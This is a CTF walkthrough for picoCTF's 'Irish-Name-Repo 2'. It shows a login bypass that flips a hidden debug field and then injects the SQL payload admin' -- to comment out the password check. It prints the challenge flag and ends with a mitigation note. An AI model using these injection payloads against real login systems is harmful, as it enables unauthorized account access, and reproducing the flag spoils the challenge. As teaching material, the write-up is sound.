# Irish-Name-Repo 2 – CTF Walkthrough

Let’s break into this challenge 🕵️‍♂️

---

## 🔍 Initial Observation

This one feels familiar... just like **Irish-Name-Repo 1** — we’re greeted with the same login interface.

Tried logging in as admin with random credentials... and of course, **no luck**.
Alright, time to bring out the tools.

---

## 🛠️ Flip the Hidden Switch

Intercepted the request with **Burp Suite** and spotted a familiar hidden field:

```
debug=0
```

That’s a red flag for dev mode. So as usual, I flipped it to `debug=1`.


---

## ⚠️ Classic SQL Injection Attempt

I went with the usual payload:

```text
username: ' or 1=1 --
password: anything
```

But... nothing happened.

Then I remembered the hint:

> “**The password is being filtered**”

So the backend must be sanitizing or strictly validating the password field.

---

## 💡 Bypassing with a Simpler Payload

I thought — why even touch the password if it’s being filtered?

Let’s try:

```text
username: admin' --
password: anything
```

Which gives a SQL query like:

```sql
SELECT * FROM users WHERE name='admin' --' AND password='anything'
```

![debug flipped](https://github.com/user-attachments/assets/22c2695d-64e9-4522-8326-f54850f4ff0e)


The comment (`--`) **kills off the password check entirely** — and guess what?

✅ It worked.

---

## 🏁 Flag

```
picoCTF{m0R3_SQL_plz_fa983901}
```

---

## 🔐 Vulnerability Assessment

* **Vulnerability Type:** SQL Injection (authentication bypass)
* **Input Vector:** `username` field
* **Payload:** `admin' --`
* **Effect:** Bypasses password authentication via inline comment injection
* **Mitigation:** Use parameterized queries or ORM frameworks to prevent direct query manipulation

---

## 📘 Lesson Learned

* Not all input fields are equally vulnerable — **read hints carefully**.
* SQL injection **doesn't always need complex payloads**; sometimes a simple `--` to comment out logic is enough.
* If the password is filtered, try **single-field injection**.
* Always inspect debug outputs — they’re often **more valuable than you think**.
